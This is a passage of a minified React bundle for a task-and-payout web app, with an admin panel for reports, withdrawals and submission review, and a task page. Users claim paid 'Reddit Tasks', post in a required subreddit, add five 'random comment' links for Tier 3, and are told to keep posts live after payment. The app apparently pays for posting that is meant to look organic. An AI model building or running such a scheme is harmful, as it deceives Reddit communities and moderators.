gap-6",children:[n.jsxs("div",{className:"flex-1 space-y-4",children:[n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("div",{className:"w-10 h-10 bg-red-500/10 rounded-xl flex items-center justify-center border border-red-500/20 text-red-500",children:n.jsx(Ee,{size:20})}),n.jsxs("div",{children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("span",{className:"text-[10px] font-black text-red-500 uppercase tracking-widest",children:"Reported Problem"}),n.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),n.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase",children:new Date(d.created_at).toLocaleString()})]}),n.jsx("h4",{className:"text-sm font-bold text-white mt-0.5",children:((N=d.message.split(" | ")[2])==null?void 0:N.replace("PROBLEM: ",""))||"No details provided"})]})]}),n.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4",children:[n.jsxs("div",{className:"px-4 py-3 bg-black/40 rounded-2xl border border-white/5",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-1",children:"User Email"}),n.jsx("span",{className:"text-xs text-gray-300 font-bold",children:((E=d.message.split(" | ")[0])==null?void 0:E.replace("FROM: ",""))||"Unknown"})]}),n.jsxs("div",{className:"px-4 py-3 bg-black/40 rounded-2xl border border-white/5",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-1",children:"Task ID"}),n.jsx("span",{className:"text-xs text-blue-500 font-black",children:((P=d.message.split(" | ")[1])==null?void 0:P.replace("TASK: ",""))||"N/A"})]})]})]}),n.jsxs("div",{className:"flex flex-row sm:flex-col gap-2 w-full sm:w-auto",children:[n.jsxs("button",{onClick:()=>{var _;return kn((_=d.message.split(" | ")[0])==null?void 0:_.replace("FROM: ",""))},className:"flex-1 sm:flex-none px-6 py-3 bg-blue-600/10 text-blue-500 rounded-xl font-bold text-xs hover:bg-blue-600 hover:text-white transition-all flex items-center justify-center gap-2",children:[n.jsx(Ut,{size:16}),"REPLY"]}),n.jsxs("button",{onClick:()=>fl(d.id),className:"flex-1 sm:flex-none px-6 py-3 bg-white/[0.03] border border-white/10 text-gray-500 rounded-xl font-bold text-xs hover:text-white hover:bg-red-600 hover:border-red-600 transition-all flex items-center justify-center gap-2",children:[n.jsx(Lr,{size:16}),"RESOLVE"]})]})]})},d.id)}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(ir,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No active reports. Everything is smooth!"})]})})]}):f==="Withdrawals"?n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Completed Withdrawals"}),n.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[n.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total Paid: "}),n.jsx("span",{className:"text-sm font-black text-white",children:c.filter(d=>d.status==="completed").length})]})]}),n.jsx("div",{className:"space-y-3",children:c.filter(d=>d.status==="completed").length>0?c.filter(d=>d.status==="completed").map(d=>{const N=new Date(d.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"}),E=l.find(P=>P.email===d.user_email);return n.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-5 rounded-3xl flex flex-col sm:flex-row items-center justify-between gap-4 group hover:border-emerald-500/20 transition-all",children:[n.jsxs("div",{className:"flex items-center gap-4 flex-1",children:[n.jsx("div",{className:"w-10 h-10 bg-emerald-500/10 rounded-xl flex items-center justify-center border border-emerald-500/20 text-emerald-500",children:n.jsx(Fe,{size:18,strokeWidth:3})}),n.jsxs("div",{children:[n.jsxs("div",{className:"flex items-center gap-2 mb-0.5",children:[n.jsx("span",{className:"text-[10px] font-mono text-gray-500",children:d.transaction_id}),n.jsx("h4",{className:"text-sm font-bold text-white",children:(E==null?void 0:E.server_username)||d.user_email.split("@")[0]})]}),n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("span",{className:"text-[11px] font-bold text-gray-400",children:d.user_email}),n.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),n.jsxs("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-tight",children:["Paid on ",N]})]})]})]}),n.jsxs("div",{className:"flex items-center gap-6",children:[n.jsxs("div",{className:"text-right",children:[n.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Amount Paid"}),n.jsxs("span",{className:"text-sm font-black text-emerald-500",children:["$",d.amount.toFixed(2)]})]}),n.jsxs("div",{className:"text-right min-w-[120px]",children:[n.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Method"}),n.jsxs("div",{className:"flex items-center justify-end gap-2",children:[n.jsx("img",{src:Qa[d.payout_method.type],alt:"",className:"w-3.5 h-3.5 object-contain"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-300",children:d.payout_method.label})]})]})]})]},d.id)}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(dn,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No completed withdrawals yet."})]})})]}):n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Total Submission History"}),n.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[n.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total: "}),n.jsx("span",{className:"text-sm font-black text-white",children:a.filter(d=>d.status!=="available").length})]})]}),n.jsx("div",{className:"space-y-3",children:a.filter(d=>d.status!=="available").length>0?a.filter(d=>d.status!=="available").map(d=>{var P;const N=d.created_at?new Date(d.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"}):"---",E=l.find(_=>_.email===d.claimed_by);return n.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-5 rounded-3xl flex flex-col sm:flex-row items-center justify-between gap-4 group hover:border-blue-500/20 transition-all",children:[n.jsxs("div",{className:"flex items-center gap-4 flex-1",children:[n.jsx("div",{className:"w-10 h-10 bg-white/[0.03] rounded-xl flex items-center justify-center border border-white/5 text-gray-500 group-hover:text-blue-500 transition-colors",children:n.jsx(lr,{size:18})}),n.jsxs("div",{children:[n.jsxs("div",{className:"flex items-center gap-2 mb-0.5",children:[n.jsx("span",{className:"text-[10px] font-black text-blue-500",children:d.task_id_display}),n.jsx("h4",{className:"text-sm font-bold text-white",children:d.title}),n.jsx("span",{className:`text-[8px] font-black px-1.5 py-0.5 rounded uppercase ${d.tier==="Tier 3"?"bg-red-500/10 text-red-500":d.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:d.tier})]}),n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsxs("span",{className:"text-[11px] font-bold text-gray-400",children:[(E==null?void 0:E.server_username)||((P=d.claimed_by)==null?void 0:P.split("@")[0]),n.jsxs("span",{className:"text-gray-600 font-medium ml-1",children:["(u/",(E==null?void 0:E.reddit_username)||"not_linked",")"]})]}),n.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),n.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-tight",children:N})]})]})]}),n.jsxs("div",{className:"flex items-center gap-6",children:[n.jsxs("div",{className:"text-right",children:[n.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Reward"}),n.jsx("span",{className:"text-sm font-black text-emerald-500",children:d.reward})]}),n.jsxs("div",{className:"text-right min-w-[100px]",children:[n.jsx("span",{className:"block text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5",children:"Status"}),n.jsxs("div",{className:"flex items-center justify-end gap-1.5",children:[n.jsx("div",{className:`w-1.5 h-1.5 rounded-full ${d.status==="verified"?"bg-emerald-500":d.status==="submitted"?"bg-amber-500 animate-pulse":d.status==="rejected"?"bg-red-500":"bg-blue-500"}`}),n.jsx("span",{className:`text-[10px] font-black uppercase tracking-widest ${d.status==="verified"?"text-emerald-500":d.status==="submitted"?"text-amber-500":d.status==="rejected"?"text-red-500":"text-blue-500"}`,children:d.status})]})]})]})]},d.id)}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(Ee,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"No submissions recorded yet."})]})})]}),n.jsxs("section",{className:"mt-20 p-8 border border-dashed border-white/10 rounded-[32px] bg-white/[0.01]",children:[n.jsx("h2",{className:"text-sm font-bold text-gray-500 uppercase tracking-[0.2em] mb-4",children:"Security Notice"}),n.jsx("p",{className:"text-xs text-gray-600 leading-relaxed",children:"This admin panel is restricted to authorized personnel. All task distributions are logged with your IP address and timestamp. Ensure all target URLs comply with the network's safety guidelines before publishing."})]}),j&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:n.jsx(Ut,{className:"text-blue-500",size:32})}),n.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Send Admin Alert"}),n.jsxs("p",{className:"text-gray-500 text-sm",children:["To: ",n.jsx("span",{className:"text-blue-400 font-bold",children:m})]})]}),n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{className:"space-y-3",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:"Message Content"}),n.jsx("textarea",{rows:4,autoFocus:!0,placeholder:"Enter the alert or update details for the user...",value:k,onChange:d=>C(d.target.value),className:"w-full px-6 py-5 bg-white/[0.03] border border-white/5 rounded-3xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),n.jsxs("div",{className:"flex gap-4",children:[n.jsx("button",{onClick:()=>y(!1),className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:Nl,disabled:!k.trim()||S,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed",children:S?"Sending...":n.jsxs(n.Fragment,{children:["Send Alert",n.jsx(un,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"})]})})]})]})]})}),T&&$&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-red-600/10 rounded-2xl flex items-center justify-center mb-6 border border-red-500/20",children:n.jsx(re,{className:"text-red-500",size:32})}),n.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Reject Submission"}),n.jsxs("p",{className:"text-gray-500 text-sm",children:["Task: ",n.jsx("span",{className:"text-red-400 font-bold",children:$.title})]}),n.jsxs("p",{className:"text-gray-600 text-xs mt-1",children:["User: ",$.claimed_by]})]}),n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{className:"space-y-3",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:"Rejection Reason"}),n.jsx("textarea",{rows:4,autoFocus:!0,placeholder:"Enter the reason for rejection...",value:fe,onChange:d=>se(d.target.value),className:"w-full px-6 py-5 bg-white/[0.03] border border-white/5 rounded-3xl focus:outline-none focus:border-red-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),n.jsxs("div",{className:"flex gap-4",children:[n.jsx("button",{onClick:()=>{L(!1),G(null),se("")},className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:jl,disabled:!fe.trim()||J,className:"flex-1 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed",children:J?"Rejecting...":n.jsxs(n.Fragment,{children:["Reject Task",n.jsx(re,{size:18,strokeWidth:3})]})})]})]})]})}),ie&&I&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-lg bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-12 shadow-2xl animate-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-emerald-600/10 rounded-2xl flex items-center justify-center mb-6 border border-emerald-500/20",children:n.jsx(Er,{className:"text-emerald-500",size:32})}),n.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Confirm Payout"}),n.jsxs("p",{className:"text-gray-500 text-sm",children:["Transaction ID: ",n.jsx("span",{className:"text-blue-400 font-mono font-bold",children:I.transaction_id})]}),n.jsxs("div",{className:"mt-4 p-4 bg-white/[0.02] border border-white/5 rounded-2xl w-full text-left",children:[n.jsxs("div",{className:"flex justify-between items-center mb-3",children:[n.jsx("span",{className:"text-xs font-bold text-gray-500 uppercase",children:"Amount to Pay"}),n.jsxs("span",{className:"text-xl font-black text-emerald-500",children:["$",I.amount.toFixed(2)]})]}),n.jsxs("div",{className:"space-y-2",children:[n.jsx("span",{className:"text-[10px] font-bold text-gray-600 uppercase tracking-widest block",children:"Recipient Details"}),n.jsxs("div",{className:"flex items-center gap-3 p-3 bg-black/40 rounded-xl border border-white/5",children:[n.jsx("img",{src:Qa[I.payout_method.type],alt:"",className:"w-5 h-5 object-contain"}),n.jsxs("div",{className:"min-w-0",children:[n.jsx("p",{className:"text-[10px] font-black text-gray-400 uppercase leading-none mb-1",children:I.payout_method.label}),n.jsx("p",{className:"text-xs font-bold text-white truncate",children:I.payout_method.value})]})]})]})]})]}),n.jsxs("div",{className:"flex gap-4",children:[n.jsx("button",{onClick:()=>{ne(!1),D(null)},className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:_l,disabled:W,className:"flex-1 py-4 bg-emerald-600 text-white rounded-2xl font-black text-sm hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2 group disabled:opacity-50",children:W?"Processing...":n.jsxs(n.Fragment,{children:["Confirm & Pay",n.jsx(Fe,{size:18,strokeWidth:3})]})})]})]})})]})]}):n.jsxs(hr,{children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${me.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${me.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":me.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:me.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):me.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:me.message})]}),n.jsx("button",{onClick:()=>Qt(d=>({...d,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsx("div",{className:"min-h-[70vh] flex items-center justify-center p-4",children:n.jsxs("div",{className:"w-full max-w-md bg-white/[0.02] border border-white/5 rounded-[32px] p-8 sm:p-10 backdrop-blur-xl animate-in fade-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:n.jsx(Mr,{className:"text-blue-500",size:32})}),n.jsx("h1",{className:"text-2xl font-black tracking-tight mb-2",children:"Admin Access"}),n.jsx("p",{className:"text-gray-500 text-sm",children:"Enter the admin passcode to continue."})]}),n.jsxs("form",{onSubmit:hl,className:"space-y-6",children:[n.jsx("div",{className:"space-y-2",children:n.jsxs("div",{className:"relative group",children:[n.jsx($t,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:20}),n.jsx("input",{type:"password",placeholder:"",value:e,onChange:d=>t(d.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-center tracking-[0.5em] font-mono text-lg"})]})}),n.jsx("button",{type:"submit",className:"w-full py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]",children:"ACCESS PANEL"})]})]})})]})},Yw=()=>{const{id:e}=fg(),t=St(),[r,s]=b.useState(null),[a,i]=b.useState(!0),[l,o]=b.useState(!1),[c,u]=b.useState(""),[h,p]=b.useState(""),[x,v]=b.useState(["","","","",""]),[f,w]=b.useState({show:!1,message:"",type:"info"}),[j,y]=b.useState(""),[m,g]=b.useState(!1),[k,C]=b.useState(!1),S=(J,B="info")=>{w({show:!0,message:J,type:B}),setTimeout(()=>w(ie=>({...ie,show:!1})),2e3)};b.useEffect(()=>{R(),T()},[e]);const R=async()=>{const{data:J,error:B}=await z.from("tasks").select("*").eq("id",e).single();J&&s(J),i(!1)},T=async()=>{const J=ft("user_email")||localStorage.getItem("user_email");if(!J)return;const{data:B}=await z.from("profiles").select("reddit_username").eq("email",J).single();B&&u(B.reddit_username)},L=async()=>{const J=ft("user_email")||localStorage.getItem("user_email");if(!J)return;if(!c||c==="not_connected"||!c.trim()){S("You must link a valid Reddit account in your Profile settings to claim tasks.","error"),setTimeout(()=>t("/account"),2e3);return}o(!0);const{error:B}=await z.from("tasks").update({status:"claimed",claimed_by:J}).eq("id",e).eq("status","available");B?S("Error claiming task: "+B.message,"error"):(S("Task claimed! You can now start working.","success"),R()),o(!1)},$=(J,B)=>{const ie=J.toLowerCase().trim();if(!(ie.includes("reddit.com/r/")||ie.startsWith("r/")))return!1;if(B){const I=`/r/${B.toLowerCase()}`;return ie.includes(I)}return!0},G=async()=>{if(!j.trim())return;g(!0);const J=ft("user_email")||localStorage.getItem("user_email"),{error:B}=await z.from("admin_alerts").insert([{user_email:"ADMIN_REPORT",message:`FROM: ${J} | TASK: ${r==null?void 0:r.task_id_display} | PROBLEM: ${j}`}]);B?S("Error sending report: "+B.message,"error"):(S("Report sent to admins. We will look into it.","success"),y("")),g(!1)},fe=async()=>{var J;if(!h){S("Please enter the main task link.","error");return}if(!$(h,(r==null?void 0:r.subreddit)||"")){h.toLowerCase().includes("reddit.com/r/")?S(`This task requires a link specifically from r/${r==null?void 0:r.subreddit}.`,"error"):S("Please enter a valid Reddit link (e.g., https://reddit.com/r/...)","error");return}if((J=r==null?void 0:r.tier)!=null&&J.includes("Tier 3")){if(!x.every(ne=>ne&&ne.trim()!=="")){S("Tier 3 tasks require all 5 random comment links to be filled.","error");return}if(new Set(x.filter(ne=>ne.trim()!=="")).size!==5){S("All 5 random comment links must be unique.","error");return}}C(!0)},se=async()=>{o(!0),C(!1);const J=ft("user_email")||localStorage.getItem("user_email");if(!J){S("Session expired. Please log in again.","error"),o(!1);return}try{const{error:B}=await z.from("tasks").update({status:"submitted",submission_data:{main_link:h.trim(),random_comments:x.map(ie=>ie.trim()).filter(ie=>ie!==""),submitted_at:new Date().toISOString()}}).eq("id",e).eq("claimed_by",J);B?(console.error("Submission error:",B),S("Error submitting task: "+B.message,"error")):(S("Task submitted successfully! Awaiting verification.","success"),R())}catch(B){console.error("Unexpected submission error:",B),S("An unexpected error occurred during submission.","error")}finally{o(!1)}};return a?n.jsx("div",{className:"min-h-screen bg-black flex items-center justify-center text-blue-500 font-bold",children:"Loading Task..."}):r?n.jsx(hr,{children:n.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-4 duration-300",children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${f.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsx("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${f.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":f.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:f.type==="success"?n.jsx(ir,{size:24,strokeWidth:3}):f.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:f.message})]})})}),n.jsxs("div",{className:"max-w-4xl mx-auto py-8 px-4 sm:px-6",children:[n.jsxs("button",{onClick:()=>t("/tasks"),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all mb-8 group",children:[n.jsx(Li,{size:18,className:"group-hover:-translate-x-1 transition-transform"}),n.jsx("span",{className:"font-bold text-sm",children:"Back to Tasks"})]}),n.jsxs("div",{className:"flex flex-col md:flex-row md:items-start justify-between gap-6 mb-8",children:[n.jsxs("div",{className:"space-y-4",children:[n.jsxs("div",{className:"flex items-center gap-2 text-gray-400",children:[n.jsx(Ut,{size:16}),n.jsx("span",{className:"text-[10px] font-black uppercase tracking-widest",children:r.category||"Reddit Task"})]}),n.jsxs("h1",{className:"text-4xl font-black tracking-tighter uppercase italic flex items-center gap-4",children:["Task ",r.task_id_display,n.jsx("span",{className:`text-xs not-italic font-black px-3 py-1 rounded-lg ${r.tier==="Tier 3"?"bg-red-500/10 text-red-500 border border-red-500/20":r.tier==="Tier 2"?"bg-amber-500/10 text-amber-500 border border-amber-500/20":"bg-emerald-500/10 text-emerald-500 border border-emerald-500/20"}`,children:r.tier})]}),n.jsx("div",{className:"flex items-center gap-4",children:n.jsxs("div",{className:"flex items-center gap-2 px-3 py-1.5 bg-white/[0.03] border border-white/5 rounded-xl",children:[n.jsx("div",{className:"w-5 h-5 bg-[#FF4500] rounded-full flex items-center justify-center",children:n.jsx("svg",{viewBox:"0 0 24 24",className:"w-3 h-3 fill-white",xmlns:"http://www.w3.org/2000/svg",children:n.jsx("path",{d:"M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.051l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.945 0 1.712.767 1.712 1.712 0 .593-.306 1.11-.764 1.398.032.183.051.369.051.563 0 2.315-2.72 4.192-6.075 4.192-3.354 0-6.074-1.877-6.074-4.192 0-.194.02-.38.051-.563a1.712 1.712 0 0 1-1.114-2.622c.307-.31.73-.491 1.207-.491.478 0 .901.182 1.207.491 1.194-.856 2.85-1.419 4.674-1.488l.82-3.818a.312.312 0 0 1 .37-.243l2.672.567c.058-.051.126-.093.197-.122zm-6.11 7.115c-.631 0-1.145.513-1.145 1.145s.514 1.145 1.145 1.145c.632 0 1.145-.513 1.145-1.145s-.513-1.145-1.145-1.145zm4.22 0c-.632 0-1.145.513-1.145 1.145s.513 1.145 1.145 1.145c.631 0 1.145-.513 1.145-1.145s-.514-1.145-1.145-1.145zm-4.22 3.183c-.11 0-.213.044-.29.121-.423.422-1.328.462-1.62.462a.41.31 0 1 0 0 .82c.728 0 1.938-.11 2.546-.718a.41.41 0 0 0-.636-.585zm4.22 0c-.11 0-.213.044-.29.121-.423.422-1.328.462-1.62.462a.41.31 0 1 0 0 .82c.728 0 1.938-.11 2.546-.718a.41.41 0 0 0-.636-.585z"})})}),n.jsxs("span",{className:"text-xs font-bold text-white",children:["u/",c||"Account"]}),n.jsx("span",{className:"text-gray-600 text-[10px]",children:""}),n.jsx("span",{className:"text-[10px] text-gray-500 font-bold",children:"Task accepted with this account"})]})}),n.jsx("div",{className:"flex items-center gap-4 text-gray-500",children:n.jsxs("div",{className:"flex items-center gap-1.5 text-xs font-bold",children:[n.jsx(Ht,{size:14}),"Deadline: ",new Date(r.deadline).toLocaleString([],{dateStyle:"medium",timeStyle:"short"})]})})]}),n.jsxs("div",{className:"bg-emerald-500/10 border border-emerald-500/20 px-8 py-4 rounded-2xl flex flex-col items-center",children:[n.jsxs("span",{className:"text-3xl font-black text-emerald-500",children:["$",r.reward]}),n.jsx("span",{className:"text-[10px] font-black uppercase tracking-widest text-emerald-500/60 mt-1",children:"Reward"})]})]}),n.jsxs("div",{className:"p-6 bg-red-500/5 border border-red-500/20 rounded-3xl flex gap-4 items-start mb-8 animate-in fade-in slide-in-from-top-4 duration-500",children:[n.jsx("div",{className:"w-10 h-10 bg-red-500/10 rounded-2xl flex items-center justify-center shrink-0 border border-red-500/20",children:n.jsx(Ee,{className:"text-red-500",size:24})}),n.jsxs("div",{children:[n.jsx("h3",{className:"font-black text-red-500 text-sm uppercase tracking-wider mb-1",children:"Important Warning"}),n.jsxs("p",{className:"text-sm leading-relaxed text-gray-400",children:["Deleting your post/comment after receiving payment will result in a ",n.jsx("span",{className:"text-red-500 font-bold",children:"permanent ban"})," from the platform. Keep your submissions live to maintain eligibility."]})]})]}),r.status==="claimed"&&n.jsxs("div",{className:"p-6 bg-white/[0.02] border border-white/5 rounded-3xl flex items-center gap-4 mb-12 animate-in fade-in zoom-in",children:[n.jsx("div",{className:"w-10 h-10 bg-emerald-500/10 rounded-2xl flex items-center justify-center shrink-0 border border-emerald-500/20",children:n.jsx(ir,{className:"text-emerald-500",size:24})}),n.jsxs("div",{className:"flex-1",children:[n.jsx("h3",{className:"font-bold text-white text-sm",children:"Task Claimed"}),n.jsx("p",{className:"text-xs text-gray-500",children:"You've claimed this task. Complete it to earn your reward."})]})]}),r.status==="submitted"&&n.jsxs("div",{className:"p-6 bg-amber-500/5 border border-amber-500/20 rounded-3xl flex items-center gap-4 mb-12 animate-in fade-in zoom-in",children:[n.jsx("div",{className:"w-10 h-10 bg-amber-500/10 rounded-2xl flex items-center justify-center shrink-0 border border-amber-500/20",children:n.jsx(Ee,{className:"text-amber-500",size:24})}),n.jsxs("div",{children:[n.jsx("h3",{className:"font-bold text-amber-500 text-sm",children:"Pending Verification"}),n.jsx("p",{className:"text-xs text-gray-500",children:"Your submission is being reviewed by admins."})]})]}),r.status==="verified"&&n.jsxs("div",{className:"p-6 bg-emerald-500/5 border border-emerald-500/20 rounded-3xl flex items-center gap-4 mb-12 animate-in fade-in zoom-in",children:[n.jsx("div",{className:"w-10 h-10 bg-emerald-500/10 rounded-2xl flex items-center justify-center shrink-0 border border-emerald-500/20",children:n.jsx(ir,{className:"text-emerald-500",size:24})}),n.jsxs("div",{children:[n.jsx("h3",{className:"font-bold text-emerald-500 text-sm",children:"Task Completed"}),n.jsx("p",{className:"text-xs text-gray-500",children:"Reward has been added to your wallet."})]})]}),r.status==="available"&&n.jsxs("div",{className:"mb-12",children:[n.jsxs("button",{onClick:L,disabled:l,className:"w-full py-5 bg-blue-600 text-white rounded-[32px] font-black text-lg hover:bg-blue-700 transition-all shadow-2xl shadow-blue-600/40 flex items-center justify-center gap-3 group disabled:opacity-50",children:[l?"Claiming...":"Claim This Task",!l&&n.jsx(Li,{size:20,className:"rotate-180 group-hover:translate-x-1 transition-transform"})]}),n.jsx("p",{className:"text-center text-gray-600 text-[10px] mt-4 uppercase font-bold tracking-widest",children:"Only one person can claim this task at a time."})]}),(r.status==="claimed"||r.status==="submitted"||r.status==="verified")&&n.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-12 